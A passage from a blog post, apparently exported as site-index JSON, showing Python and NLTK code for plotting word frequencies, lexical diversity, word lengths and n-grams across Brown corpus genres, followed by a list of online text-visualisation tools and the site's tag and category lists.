code below will plot frequency distribution for a government text, you can change the genre to see distribution for a different genre like try humor, new, etc. 123456# get all words for government corpuscorpus_genre = 'government'words = [word for word in brown.words(categories=corpus_genre) if word.lower() not in stop_words and word.isalpha() ]freqdist = nltk.FreqDist(words)plt.figure(figsize=(16,5))freqdist.plot(50) Lexical diversity dispersion plot: lexical diversity lets us what is the percentage of the unique words in the text corpus for example if there are 100 words in the corpus and there are only 20 unique words then lexical diversity is 20/100=0.2. The formula for calculating lexical diversity is as below : $$ \\text{Lexical diversity(LD)}= \\frac{\\text{Number of unique words}}{\\text{Number of words}} $$ Below is the python function to calculate the lexical diversity 12345678910111213141516171819def lexical_diversity(text): return round(len(set(text)) / len(text),2)def get_brown_corpus_words(category, include_stop_words=False): '''helper method to get word array for a particular category of brown corpus which may/may not include the stopwords that can be toggled with the include_stop_words flag in the function parameter''' if include_stop_words: words = [word.lower() for word in brown.words(categories=category) if word.isalpha() ] else: words = [word.lower() for word in brown.words(categories=category) if word.lower() not in stop_words and word.isalpha() ] return words# calculate and print lexical diversity for each genre of the brown corpusfor genre in brown.categories(): lex_div_with_stop = lexical_diversity(get_brown_corpus_words(genre, True)) lex_div = lexical_diversity(get_brown_corpus_words(genre, False)) print(genre ,lex_div , lex_div_with_stop) The table below summarizing the result of the above code, humor category seems to have most lexical diversity followed by science fiction, government genre has the least diversity. If we remove the stopwords then the metric seems to change which is shown in the rightmost column in the table, metrics seems to get almost half. stopwords are extremely common words that have very little or of no valuable information like the, are, as, by, etc. Genre LD (with stopwords) LD (w/o stopwords) Humor 0.49 0.25 Science Fiction 0.47 0.24 Reviews 0.39 0.21 Religion 0.32 0.16 Editorial 0.29 0.16 Fiction 0.28 0.14 Adventure 0.26 0.13 Mystery 0.26 0.13 Romance 0.26 0.13 Hobbies 0.25 0.13 News 0.24 0.13 Lore 0.24 0.13 Government 0.20 0.11 Belles Lettres 0.20 0.10 Learned 0.16 0.09 It would also be interesting to see how to lexical diversity changes in the corpus. To visualise this we can divide a text corpus into small chunks and calculate the diversity for that chuck and plot it. Corpus can be divided by sentence or we can consider each paragraph as chunks but for sake of simplicity we can consider a batch of 1000 words as a chunk and plot its lexical diversity. So x-axis is the chunk offset and y-axis is the lexical diversity of that chunk. Below is the code to plot lexical diversity distribution for different genre of brown text corpus 12345678plt.figure(figsize=(16,8))for cat in brown.categories(): plot_array = lexical_array(cat) plt.plot(np.arange(0,len(plot_array))*5000,plot_array,label=cat)plt.legend()plt.xlabel('Word offset')plt.ylabel('Lexical diversity')plt.show() Observing the plot we can conclude that some genre of text starts with less diversity and diversity increases as the corpus offset increases like learned. But for some genre, the lexical distribution is high on an average example is belles_letters vs learned category. Word length distribution plot: This plot is word length on x-axis vs number of words of that length on the y-axis. This plot helps to visualise the composition of different word length in the text corpus. Below is the code the achieve this 1234567cfd = nltk.ConditionalFreqDist( (genre, len(word)) for genre in brown.categories() for word in get_brown_corpus_words(genre))plt.figure(figsize=(16,8))cfd.plot() N-gram frequency distribution plot: n-grams is the continuous sequences of n words that occur very often for example for n=2 we are looking for 2 words that occur very often together like New York, Butter milk, etc. such pair of words are also called bigram, for n=3 its called trigram and so on. N-gram distribution plot tries to visualise distribution n-grams for different value of n, for this example, we consider n from 1 to 5. In the plot, x-axis has the different value of n and y-axis has the number of time n-gram sequence has occurred. Below is the code to plot the distribution plot. 1234567891011from nltk.util import ngramsplt.figure(figsize=(16,8))for genre in brown.categories(): sol = [] for i in range(1,6): count = 0 fdist = nltk.FreqDist(ngrams(get_brown_corpus_words(genre), i)) sol.append(len([cnt for ng,cnt in fdist.most_common() if cnt &gt; 1])) plt.plot(np.arange(1,6), sol, label=genre)plt.legend()plt.show() Online toolsThis section of the post is for those people who might feel lazy or just don’t want to code to get the work done, you could use some of the tools available online which require no coding skills. You just have to paste the text or upload the file to get nice visualization. Below is the list of few tools that I found to be useful. Voyant: this app produces some of the above plots on a nice web dashboards. The plots which could be found are wordcloud, trend graph, etc. If you click on the word in the reader tab you will able to see all the sentence in which the word appears which can be very helpful to do some query based on words. There are also other metrics to explore, I would suggest you to explore the dashboard in detail. Visualize text as a network : This tool visualises text as a graph, the details of the algorithms on how to produce the graph is published inthis paper. If you click on one node it will highlight all connected nodes. The words which we see on the nodes are called concepts and the concepts which are related are connected by edges. Google n-gram viewer: Google has a very big corpus of books data which could be queried with this tool. What this tool give is the tread of words used in the books written in English and publish in the United States, for example, you can query trends in three n-grams from 1950 to 2000: “health care” (a 2-gram or bigram), “healthy” (a 1-gram or unigram), and “child care” (another bigram). In the chart y-axis shows all the bigrams word contained in the books, what percentage of them are “health care” or “child care”? Of all the unigrams, what percentage of them are “healthy”? you can see how the use of the words have changed over time if you are querying multiple words then you can compare their trends. There few advanced features of the Ngram Viewer, for those who want to dig a little deeper into phrase usage: wildcard search, inflection search, case-insensitive search, part-of-speech tags and n-gram compositions, more info on these features can be found on this link. ANNIS: is an open source, web browser-based search and visualization architecture for complex multi-layer linguistic corpora with diverse types of annotation. ANNIS, which stands for ANNotation of Information Structure. ANNIS addresses the need to concurrently annotate, query and visualise data from such varied areas as syntax, semantics, morphology, prosody, referentiality, lexis and more. For projects working with spoken language, support for audio/video annotations is also required. You can query large-scale dataset as ANNIS store data in Postgres which faster as compared to other storage formats like XML. TokenX: is a free and open-source cross-platform Unicode &amp; XML based text/corpus analysis environment and graphical client, supporting Windows, Linux and Mac OS X. It can also be used online as a J2EE standard compliant web portal (GWT based) with access control built in. ConclusionExploratory text analytics can be really simple as we saw, some basic visualization can help you to get a good understanding of the text corpus and also some of the metrics discussed above can help you to compare different text corpus in your dataset. We also discussed some online tools which can help you to dig deeper you can try analysing some of the datasets whose link I have posted in below play around which these tools. Useful links Ipython Notebook for above code samples Stanford lecture slides on text visualization Linguistic datasets Collection of tools and datasets Some more data set","link":"/2017/10/02/visual-text-analytics-with-python/"}],"tags":[{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"pwnable-kr","slug":"pwnable-kr","link":"/tags/pwnable-kr/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"pwnable","slug":"pwnable","link":"/tags/pwnable/"},{"name":"Exploitation","slug":"Exploitation","link":"/tags/Exploitation/"},{"name":"Windows Reversing","slug":"Windows-Reversing","link":"/tags/Windows-Reversing/"},{"name":"Malware Analysis","slug":"Malware-Analysis","link":"/tags/Malware-Analysis/"},{"name":"Dropper","slug":"Dropper","link":"/tags/Dropper/"},{"name":"Windows Malware","slug":"Windows-Malware","link":"/tags/Windows-Malware/"},{"name":"Arduino","slug":"Arduino","link":"/tags/Arduino/"},{"name":"ESP8266","slug":"ESP8266","link":"/tags/ESP8266/"},{"name":"Bare-Metal","slug":"Bare-Metal","link":"/tags/Bare-Metal/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"Data Wrangling","slug":"Data-Wrangling","link":"/tags/Data-Wrangling/"},{"name":"Linux Malware","slug":"Linux-Malware","link":"/tags/Linux-Malware/"},{"name":"radare2","slug":"radare2","link":"/tags/radare2/"},{"name":"Emacs","slug":"Emacs","link":"/tags/Emacs/"},{"name":"Dev","slug":"Dev","link":"/tags/Dev/"},{"name":"Editor","slug":"Editor","link":"/tags/Editor/"},{"name":"ACS712","slug":"ACS712","link":"/tags/ACS712/"},{"name":"Kernel Debugging","slug":"Kernel-Debugging","link":"/tags/Kernel-Debugging/"},{"name":"glibc","slug":"glibc","link":"/tags/glibc/"},{"name":"Chat Bots","slug":"Chat-Bots","link":"/tags/Chat-Bots/"},{"name":"Grey Energy","slug":"Grey-Energy","link":"/tags/Grey-Energy/"},{"name":"javascript obfuscation","slug":"javascript-obfuscation","link":"/tags/javascript-obfuscation/"},{"name":"GandCrab","slug":"GandCrab","link":"/tags/GandCrab/"},{"name":"Classification","slug":"Classification","link":"/tags/Classification/"},{"name":"Regression","slug":"Regression","link":"/tags/Regression/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","link":"/tags/Reverse-Engineering/"},{"name":"Visualization","slug":"Visualization","link":"/tags/Visualization/"}],"categories":[{"name":"Reverse Engineering","slug":"Reverse-Engineering","link":"/categories/Reverse-Engineering/"},{"name":"Malware Analysis","slug":"Malware-Analysis","link":"/categories/Malware-Analysis/"},{"name":"Exploitation","slug":"Exploitation","link":"/categories/Exploitation/"},{"name":"CTF Writeups","slug":"CTF-Writeups","link":"/categories/CTF-Writeups/"},{"name":"IoT","slug":"IoT","link":"/categories/IoT/"},{"name":"Binary Exploitation","slug":"Binary-Exploitation","link":"/categories/Binary-Exploitation/"},{"name":"Machine Learning","slug":"Machine-Learning","link":"/categories/Machine-Learning/"},{"name":"Brain Logs","slug":"Brain-Logs","link":"/categories/Brain-Logs/"},{"name":"NLP","slug":"NLP","link":"/categories/NLP/"}]}